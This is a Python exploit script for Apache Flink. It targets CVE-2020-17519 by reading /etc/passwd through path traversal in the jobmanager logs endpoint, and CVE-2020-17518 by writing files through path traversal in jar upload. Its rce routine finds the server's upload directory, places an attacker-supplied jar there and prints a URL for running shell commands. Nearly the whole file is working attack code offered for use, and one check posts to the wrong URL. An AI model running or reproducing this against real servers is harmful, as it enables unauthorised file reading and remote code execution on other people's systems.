#! /usr/bin/env python
# -*- coding:utf-8 -*-
#Author:gshell

import requests
import sys
import re
import json
import base64


auth = """
   ___               _____        __         __   __
  / _ )  __ __      / ___/  ___  / /  ___   / /  / /
 / _  | / // /     / (_ /  (_-< / _ \/ -_) / /  / / 
/____/  \_, /      \___/  /___//_//_/\__/ /_/  /_/  
       /___/
====================================================
"""

session = requests.Session()

uri_18 = "/jars/upload'%2bsss"
uri_19 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
uri_rce = "/jobmanager/config"

def CVE_2020_17519(url):
    headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0","Connection":"close","Referer":"http://47.116.137.230:8081/","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate"}

    url = url + uri_19
    res = session.get(url, headers=headers)

    pattern=re.compile(
        r"((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody"
        r"|syslog|mysql"
        r"|bind|ftp|sshd|postfix):[\d\w\-\s,]+:\d+:\d+:[\w\-_\s,]*:[\w\-_\s,\/]*:[\w\-_,"
        r"\/]*[\r\n])")
    re_text=pattern.findall(res.text)

    if  len(re_text)>1 and res.status_code == 200:
        print("[+] 存在CVE_2020_17519漏洞：{}".format(url))

def CVE_2020_17518(url):

    url1 = url + uri_18
    paramsMultipart = [('jarfile', ('../../../../../tmp/test', "test\r\n", 'application/octet-stream'))]
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2689.88 Safari/537.36","Connection":"close","Accept-Encoding":"gzip, deflate","Accept":"*/*"}

    res = session.post(url, files=paramsMultipart, headers=headers)

    if  len(res.text) == 25 and "Not found" in res.text and "errors" in res.text:
            print("[+] 存在CVE_2020_17518漏洞：{}".format(url))

def rce(url):
    web_url = url + uri_rce
    # print(url)
    upload_jar_url = url + "/jars/upload"
    res1 = requests.get(web_url,verify=False)
    json_str = json.loads(res1.text)

    for key in json_str:
        if key['key'] == "web.tmpdir":
            webdir = key['value']
            print("web目录：{}".format(webdir))

    file = open(jar,'rb')
    
    files = {'jarfile': ('../../../../../..%s/flink-web-upload/gshell.jar' % webdir, file, 'application/octet-stream')}
    r2 = requests.post(upload_jar_url, files=files, timeout=10, verify=False)
    print('shell地址：{}/jars/gshell.jar/run?entry-class=Execute&program-args="cmd"'.format(url))

if __name__ == "__main__":
    print(auth)

    if len(sys.argv) < 2:
        print("usage:python flink_write.py -u website -j jar!")
    else:
        url = sys.argv[sys.argv.index("-u")+1]
        jar = sys.argv[sys.argv.index("-u")+3]
        CVE_2020_17518(url)
        CVE_2020_17519(url)
        rce(url)